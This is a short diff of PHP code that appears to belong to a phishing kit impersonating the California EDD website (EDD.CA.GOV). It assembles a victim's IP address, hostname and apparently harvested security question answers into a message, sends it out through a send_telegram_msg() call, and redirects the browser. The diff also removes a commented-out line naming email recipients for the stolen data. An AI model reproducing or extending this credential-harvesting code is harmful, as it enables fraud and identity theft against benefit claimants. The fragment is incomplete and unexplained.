@@ -15,7 +15,6 @@ $message .= "Client IP : ".$ip."\n";
 $message .= "HostName : ".$hostname."\n";
 $rnessage = "$message\n";
 $message .= "-----Eddd.caa---Mad------\n";
-// $recipient = "coyjerry910@gmail.com,coyjerry910@yahoo.com,coyjerry910@aol.com";
 $subject = "EDD.CA.GOV---QUESTION AND ANSWER\r\n\r\n".$message;
 send_telegram_msg($message);
 header("Location: --==++.php");
